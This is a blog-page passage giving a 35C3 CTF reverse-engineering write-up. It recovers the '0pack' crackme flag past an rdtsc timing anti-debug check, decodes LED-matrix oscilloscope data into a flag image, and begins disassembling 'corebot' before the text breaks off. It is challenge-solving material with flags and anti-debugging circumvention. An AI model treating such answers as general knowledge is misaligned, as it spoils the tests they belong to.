@@ -1,0 +1,300 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="referrer" content="no-referrer" />
+    <meta name="description" content="0x01 0pack123.&#x2F;0pack.elfps -ef|grep 0pack.elfgdb attach 1234567891011121314151617181920212223242526while input:   0x55561c698a28    movzx  eax, byte ptr [rbp - 0x80]  ;get input   0x55561c698a2c">
+<meta property="og:type" content="article">
+<meta property="og:title" content="35C3_Re">
+<meta property="og:url" content="http://yoursite.com/2019/01/15/35C3-Re/index.html">
+<meta property="og:site_name" content="Kirin&#39;s Blog">
+<meta property="og:description" content="0x01 0pack123.&#x2F;0pack.elfps -ef|grep 0pack.elfgdb attach 1234567891011121314151617181920212223242526while input:   0x55561c698a28    movzx  eax, byte ptr [rbp - 0x80]  ;get input   0x55561c698a2c">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/7434375-0ac50a4da7075375.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/7434375-0dc8406e13841d41.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="article:published_time" content="2019-01-14T16:18:45.000Z">
+<meta property="article:modified_time" content="2019-01-14T16:19:38.000Z">
+<meta property="article:author" content="Kirin">
+<meta property="article:tag" content="Re">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://upload-images.jianshu.io/upload_images/7434375-0ac50a4da7075375.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>35C3_Re</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+      
+<link rel="stylesheet" href="/css/rtl.css">
+
+    
+    <!-- rss -->
+    
+    
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/links/">Links</a></li>
+         
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/2019/01/15/EDU%20CTF%202019/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/2018/12/31/Vacation-Plan-2019/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2019/01/15/35C3-Re/" target="_blank" rel="noopener"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2019/01/15/35C3-Re/&text=35C3_Re" target="_blank" rel="noopener"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2019/01/15/35C3-Re/&title=35C3_Re" target="_blank" rel="noopener"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2019/01/15/35C3-Re/&is_video=false&description=35C3_Re" target="_blank" rel="noopener"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=35C3_Re&body=Check out this article: http://yoursite.com/2019/01/15/35C3-Re/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2019/01/15/35C3-Re/&title=35C3_Re" target="_blank" rel="noopener"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2019/01/15/35C3-Re/&title=35C3_Re" target="_blank" rel="noopener"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2019/01/15/35C3-Re/&title=35C3_Re" target="_blank" rel="noopener"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2019/01/15/35C3-Re/&title=35C3_Re" target="_blank" rel="noopener"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2019/01/15/35C3-Re/&name=35C3_Re&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-0pack"><span class="toc-number">1.</span> <span class="toc-text">0x01 0pack</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x02-box-of-blink"><span class="toc-number">2.</span> <span class="toc-text">0x02 box of blink</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x03-corebot"><span class="toc-number">3.</span> <span class="toc-text">0x03 corebot</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x04-juggle"><span class="toc-number">4.</span> <span class="toc-text">0x04 juggle</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        35C3_Re
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Kirin's Blog</span>
+      </span>
+      
+    <div class="postdate">
+        <time datetime="2019-01-14T16:18:45.000Z" itemprop="datePublished">2019-01-15</time>
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/CTF/">CTF</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link" href="/tags/Re/" rel="tag">Re</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h3 id="0x01-0pack"><a href="#0x01-0pack" class="headerlink" title="0x01 0pack"></a>0x01 0pack</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;0pack.elf</span><br><span class="line">ps -ef|grep 0pack.elf</span><br><span class="line">gdb attach</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">while input:</span><br><span class="line">   0x55561c698a28    movzx  eax, byte ptr [rbp - 0x80]  ;get input</span><br><span class="line">   0x55561c698a2c    mov    byte ptr [rbp - 0x82], al   ;store input[0]</span><br><span class="line">   0x55561c698a32    mov    rax, r15</span><br><span class="line">   0x55561c698a35    add    rax, 0x12475  ;RAX  0x55561c698475 — push   rsp &#x2F;* 0x67657265645f4d54 *&#x2F;</span><br><span class="line">   0x55561c698a3b    movzx  eax, byte ptr [rax]</span><br><span class="line">   0x55561c698a3e    mov    byte ptr [rbp - 0x81], al</span><br><span class="line">   0x55561c698a44    movzx  eax, byte ptr [rbp - 0x82]</span><br><span class="line">   0x55561c698a4b    cmp    al, byte ptr [rbp - 0x81]  ;cmp input&amp;*0x55561c698475</span><br><span class="line">   0x55561c698a51    jne    0x55561c698a61</span><br><span class="line"></span><br><span class="line">pwndbg&gt; x&#x2F;10xg 0x55561c698475</span><br><span class="line">0x55561c698475: 0x67657265645f4d54  0x434d547265747369</span><br><span class="line">0x55561c698485: 0x6c626154656e6f6c  0x725f4d54495f0065</span><br><span class="line">0x55561c698495: 0x5472657473696765  0x6154656e6f6c434d</span><br><span class="line">0x55561c6984a5: 0x5f764a5f00656c62  0x7265747369676552</span><br><span class="line">0x55561c6984b5: 0x0073657373616c43  0x735f6362696c5f5f</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; from pwn import *</span><br><span class="line">&gt;&gt;&gt; p64(0x67657265645f4d54)+p64(0x434d547265747369)+p64(0x6c626154656e6f6c)+p64(0x725f4d54495f0065)</span><br><span class="line">&#39;TM_deregisterTMCloneTable\x00_ITM_r&#39;</span><br><span class="line"></span><br><span class="line">this is wrong</span><br><span class="line">本以为直接是这串字符串，不过动态调试发现比较字符并不连续</span><br><span class="line">为了方便直接ida动态提取一下字符</span><br></pre></td></tr></table></figure>
+<p><strong>debug with ida:</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">v29 &#x3D; __readfsqword(0x28u);</span><br><span class="line"> v3 &#x3D; 1;</span><br><span class="line"> v18 &#x3D; &#39;ap tupnI&#39;;</span><br><span class="line"> v19 &#x3D; &#39; :drowss&#39;;</span><br><span class="line"> v20 &#x3D; 0;</span><br><span class="line"> printf(&quot;%s&quot;, &amp;v18, a1);</span><br><span class="line"> fgets(&amp;s, 15, stdin);</span><br><span class="line"> putchar(10);</span><br><span class="line"> if ( s !&#x3D; a2[74869] || (unsigned __int8)wrong() )</span><br><span class="line">   v3 &#x3D; 0;</span><br><span class="line"> if ( v5 !&#x3D; a2[74968] || (unsigned __int8)wrong() )</span><br><span class="line">   v3 &#x3D; 0;</span><br><span class="line"> if ( v6 !&#x3D; a2[74298] || (unsigned __int8)wrong() )</span><br><span class="line">   v3 &#x3D; 0;</span><br><span class="line"> if ( v7 !&#x3D; a2[74319] || (unsigned __int8)wrong() )</span><br><span class="line">   v3 &#x3D; 0;</span><br><span class="line"> if ( v8 !&#x3D; a2[74868] || (unsigned __int8)wrong() )</span><br><span class="line">   v3 &#x3D; 0;</span><br><span class="line"> if ( v9 !&#x3D; a2[74319] || (unsigned __int8)wrong() )</span><br><span class="line">   v3 &#x3D; 0;</span><br><span class="line"> if ( v10 !&#x3D; a2[74664] || (unsigned __int8)wrong() )</span><br><span class="line">   v3 &#x3D; 0;</span><br><span class="line"> if ( v11 !&#x3D; a2[74869] || (unsigned __int8)wrong() )</span><br><span class="line">   v3 &#x3D; 0;</span><br><span class="line"> if ( v12 !&#x3D; a2[74874] || (unsigned __int8)wrong() )</span><br><span class="line">   v3 &#x3D; 0;</span><br><span class="line"> if ( v13 !&#x3D; a2[74298] || (unsigned __int8)wrong() )</span><br><span class="line">   v3 &#x3D; 0;</span><br><span class="line"> if ( v14 !&#x3D; a2[74309] || (unsigned __int8)wrong() )</span><br><span class="line">   v3 &#x3D; 0;</span><br><span class="line"> if ( v15 !&#x3D; a2[74954] || (unsigned __int8)wrong() )</span><br><span class="line">   v3 &#x3D; 0;</span><br><span class="line"> if ( v16 !&#x3D; a2[74792] || (unsigned __int8)wrong() )</span><br><span class="line">   v3 &#x3D; 0;</span><br><span class="line"> if ( v17 !&#x3D; a2[74968] || (unsigned __int8)wrong() )</span><br><span class="line">   v3 &#x3D; 0;</span><br><span class="line"> if ( v3 )</span><br><span class="line"> &#123;</span><br><span class="line">   v21 &#x3D; &#39;��_��� (&#39;;</span><br><span class="line">   v22 &#x3D; &#39;��� (\n)�&#39;;</span><br><span class="line">   v23 &#x3D; &#39;��&gt;)���_&#39;;</span><br><span class="line">   v24 &#x3D; &#39;���-����&#39;;</span><br><span class="line">   v25 &#x3D; &#39;��␌�(\n&#39;;</span><br><span class="line">   v26 &#x3D; &#39;uf )���_&#39;;</span><br><span class="line">   v27 &#x3D; &#39;!haey kc&#39;;</span><br><span class="line">   v28 &#x3D; 10;</span><br><span class="line"> &#125;</span><br><span class="line"> else</span><br><span class="line"> &#123;</span><br><span class="line">   v21 &#x3D; -5557406242697676991LL;</span><br><span class="line">   LODWORD(v22) &#x3D; -1293918304;</span><br><span class="line">   WORD2(v22) &#x3D; 2720;</span><br><span class="line">   BYTE6(v22) &#x3D; 0;</span><br><span class="line"> &#125;</span><br><span class="line"> printf(&quot;%s&quot;, &amp;v21);</span><br><span class="line"> return 0LL;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">key&#x3D;[0x54,0x68,0x69,0x73,0x49,0x73,0x41,0x54,0x72,0x69,0x75,0x6d,0x70,0x68]</span><br><span class="line">flag&#x3D;&quot;&quot;</span><br><span class="line">for i in key:</span><br><span class="line">    flag+&#x3D;chr(i)</span><br><span class="line">print flag</span><br><span class="line">#ThisIsATriumph</span><br></pre></td></tr></table></figure>
+<p>something wrong:<br><strong>类似一个利用CPU处理指令的速度来反调试的过程<br>可是当我正常输入也会错误，不知道是不是我的环境问题，或者有细节没注意到<br>提交平台关了，没办法验证。这题就到这里</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">wrong():</span><br><span class="line">_BOOL8 wrong()</span><br><span class="line">&#123;</span><br><span class="line">  signed int i; &#x2F;&#x2F; [rsp+4h] [rbp-Ch]</span><br><span class="line">  unsigned __int64 v3; &#x2F;&#x2F; [rsp+8h] [rbp-8h]</span><br><span class="line">  unsigned __int64 v4; &#x2F;&#x2F; [rsp+8h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v3 &#x3D; 0LL;</span><br><span class="line">  for ( i &#x3D; 0; i &lt;&#x3D; 9; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 +&#x3D; sub_5627FBABD8E0();</span><br><span class="line">    sleep(0);</span><br><span class="line">  &#125;</span><br><span class="line">  v4 &#x3D; (unsigned __int64)(0xCCCCCCCCCCCCCCCDLL * (unsigned __int128)v3 &gt;&gt; 64) &gt;&gt; 3;</span><br><span class="line">  return v4 &gt; 0x3E7 || !v4;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">sub_5627FBABD8E0():</span><br><span class="line">unsigned __int64 sub_5627FBABD8E0()</span><br><span class="line">&#123;</span><br><span class="line">  unsigned __int64 v0; &#x2F;&#x2F; ST08_8</span><br><span class="line"></span><br><span class="line">  v0 &#x3D; __rdtsc();</span><br><span class="line">  _RAX &#x3D; 0LL;</span><br><span class="line">  __asm &#123; cpuid &#125;</span><br><span class="line">  return __rdtsc() - v0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="0x02-box-of-blink"><a href="#0x02-box-of-blink" class="headerlink" title="0x02 box of blink"></a>0x02 box of blink</h3><p><img src="https://upload-images.jianshu.io/upload_images/7434375-0ac50a4da7075375.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="35C3"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">#Model,MDO3014</span><br><span class="line">#Firmware Version,1.26</span><br><span class="line">#</span><br><span class="line">#Waveform Type,DIGITAL,,,,,,,,,,,,,</span><br><span class="line">#Point Format,Y,,,,,,,,,,,,,</span><br><span class="line">#Horizontal Units,s,,,,,,,,,,,,,</span><br><span class="line">#Horizontal Scale,0.004,,,,,,,,,,,,,</span><br><span class="line">#,,,,,,,,,,,,,,</span><br><span class="line">#Sample Interval,4e-09,,,,,,,,,,,,,</span><br><span class="line">#Record Length,1e+07,,,,,,,,,,,,,</span><br><span class="line">#Gating,0.0% to 100.0%,,,,,,,,,,,,,</span><br><span class="line">#,,,,,,,,,,,,,,</span><br><span class="line">#Vertical Units,V,V,V,V,V,V,V,V,V,V,V,V,V,V</span><br><span class="line">#Threshold Used,1.65,1.65,1.65,1.65,1.65,1.65,1.65,1.65,1.65,1.65,1.65,1.65,1.65,1.65</span><br><span class="line">#,,,,,,,,,,,,,,</span><br><span class="line">#,,,,,,,,,,,,,,</span><br><span class="line">#,,,,,,,,,,,,,,</span><br><span class="line">#,,,,,,,,,,,,,,</span><br><span class="line">#,,,,,,,,,,,,,,</span><br><span class="line">#Label,OE,LAT,CLK,E,D,C,B,A,B2,B1,G2,G1,R2,R1</span><br><span class="line">#TIME,D13,D12,D11,D10,D9,D8,D7,D6,D5,D4,D3,D2,D1,D0</span><br><span class="line">-1.0000000e-03,0,0,0,0,1,0,0,0,0,0,0,1,0,1</span><br><span class="line">-9.9999600e-04,0,0,0,0,1,0,0,0,0,0,0,1,0,1</span><br><span class="line">-9.9999200e-04,0,0,0,0,1,0,0,0,0,0,0,1,0,1</span><br><span class="line">......#data~</span><br></pre></td></tr></table></figure>
+<p><strong>MDO3014型示波器&amp;&amp;RGB LED Matrix</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">Label,OE,LAT,CLK,E,D,C,B,A,B2,B1,G2,G1,R2,R1</span><br><span class="line"></span><br><span class="line">Google一个相似的引脚定义：</span><br><span class="line"></span><br><span class="line">Label	Name	Function</span><br><span class="line">1	DR1	High R data</span><br><span class="line">2	DG1	High G data</span><br><span class="line">3	DB1	High B data</span><br><span class="line">4	GND	GND</span><br><span class="line">5	DR2	Low R data</span><br><span class="line">6	DG2	Low G data</span><br><span class="line">7	DB2	Low B data</span><br><span class="line">8	GND	GND</span><br><span class="line">9	A	A line selection</span><br><span class="line">10	B	B line selection</span><br><span class="line">11	C	C line selection</span><br><span class="line">12	D	D line selection</span><br><span class="line">13	CLK	CLOCK</span><br><span class="line">14	LAT	LATCH</span><br><span class="line">15	OE	Output Enable</span><br><span class="line">16	GND	GND</span><br></pre></td></tr></table></figure>
+<p>很显然是要通过给出的数据还原一个LED组成的图案：<br>找了一个32x32的文档：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;cdn-learn.adafruit.com&#x2F;downloads&#x2F;pdf&#x2F;32x16-32x32-rgb-led-matrix.pdf</span><br></pre></td></tr></table></figure>
+<p>主要看到：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">CLK:The CLK (clock) signal marks the arrival of each bit of</span><br><span class="line">data.#应该是上升沿触发</span><br><span class="line">OE:OE (output enable) switches the LEDs off when</span><br><span class="line">transitioning from one row to the next.</span><br><span class="line">LAT:The LAT (latch) signal marks the end of a row of</span><br><span class="line">data</span><br><span class="line">Upper RGB Data:Pins R1, G1 and B1 (labeled R0, B0 and G0 on some</span><br><span class="line">matrices) deliver data to the top half of the display.</span><br><span class="line">Lower RGB Data:Pins R2, G2 and B2 (labeled R1, G1 and B1 on some</span><br><span class="line">matrices) deliver data to the bottom half of the display.</span><br><span class="line">Row Select Lines:Pins A, B, C and D select which two rows of the display</span><br><span class="line">are currently lit. (32x16 matrices don’t have a “D” pin —</span><br><span class="line">it’s connected to ground instead.)</span><br></pre></td></tr></table></figure>
+<p>按照数据格式和引脚定义解出图案：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">from PIL import Image</span><br><span class="line"></span><br><span class="line">MAX&#x3D;128</span><br><span class="line">pic&#x3D;Image.new(&quot;RGB&quot;,(MAX*10,MAX*5*10))</span><br><span class="line"></span><br><span class="line">oe,lat,clk,row,color1,color2&#x3D;[],[],[],[],[],[]</span><br><span class="line">f&#x3D;open(&quot;.&#x2F;blink_data.csv&quot;,&quot;r&quot;)</span><br><span class="line">for line in f:</span><br><span class="line">    data &#x3D; line.strip().split(&quot;,&quot;)</span><br><span class="line">    oe.append(data[1])</span><br><span class="line">    lat.append(data[2])</span><br><span class="line">    clk.append(data[3])</span><br><span class="line">    row.append(int(data[4]+data[5]+data[6]+data[7]+data[8],2))</span><br><span class="line">    color1.append(((256-int(data[-1]))%256,(256-int(data[-3]))%256,(256-int(data[-5]))%256))</span><br><span class="line">    color2.append(((256-int(data[-2]))%256,(256-int(data[-4]))%256,(256-int(data[-6]))%256))</span><br><span class="line">f.close()</span><br><span class="line">end &#x3D; [0]</span><br><span class="line">for i in range(len(lat)-1):</span><br><span class="line">    if lat[i] &#x3D;&#x3D; &#39;0&#39; and lat[i+1] &#x3D;&#x3D; &#39;1&#39;:</span><br><span class="line">            end.append(i+1)</span><br><span class="line">end.append(10000000)</span><br><span class="line">pic_x&#x3D;0</span><br><span class="line">pic_y&#x3D;0</span><br><span class="line">blink&#x3D;0</span><br><span class="line">for i in range(len(end)-1):</span><br><span class="line">    draw&#x3D;[]</span><br><span class="line">    for j in range(len(clk[end[i]:end[i+1]])-1):</span><br><span class="line">        if clk[end[i]+j]&#x3D;&#x3D;&#39;0&#39; and clk[end[i]+j+1]&#x3D;&#x3D;&#39;1&#39;:</span><br><span class="line">            draw.append((row[end[i]+j],color1[end[i]+j],color2[end[i]+j]))</span><br><span class="line">    pic_x&#x3D;0</span><br><span class="line">    for d in draw:</span><br><span class="line">        for k in range(10):</span><br><span class="line">            for h in range(10):</span><br><span class="line">                pic.putpixel([pic_x*10+k,(blink*64+d[0])*10+h],d[1])</span><br><span class="line">                pic.putpixel([pic_x*10+k,(blink*64+d[0]+32)*10+h],d[2])</span><br><span class="line">        pic_x+&#x3D;1</span><br><span class="line">    pic_y+&#x3D;1</span><br><span class="line">    if pic_y%32&#x3D;&#x3D;0:</span><br><span class="line">        blink+&#x3D;1</span><br><span class="line">pic.show()</span><br><span class="line">pic.save(&quot;flag.png&quot;)</span><br></pre></td></tr></table></figure>
+<p><img src="https://upload-images.jianshu.io/upload_images/7434375-0dc8406e13841d41.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="flag"></p>
+<h3 id="0x03-corebot"><a href="#0x03-corebot" class="headerlink" title="0x03 corebot"></a>0x03 corebot</h3><p><strong>function start：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.text:0110116E start           proc near</span><br><span class="line">.text:0110116E                 push    0</span><br><span class="line">.text:01101170                 mov     eax, esp</span><br><span class="line">.text:01101172                 push    0               ; dwFlags</span><br><span class="line">.text:01101174                 push    18h             ; dwProvType</span><br><span class="line">.text:01101176                 push    0               ; szProvider</span><br><span class="line">.text:01101178                 push    0               ; szContainer</span><br><span class="line">.text:0110117A                 push    eax             ; phProv</span><br><span class="line">.text:0110117B                 call    CryptAcquireContextA</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">#CryptAcquireContextA</span><br><span class="line">https:&#x2F;&#x2F;docs.microsoft.com&#x2F;en-us&#x2F;dotnet&#x2F;api&#x2F;system.security.permissions.keycontainerpermissionaccessentry.providertype?view&#x3D;netframework-4.7.2</span><br><span class="line">#define PROV_RSA_FULL 1</span><br><span class="line">#define PROV_RSA_SIG 2</span><br><span class="line">#define 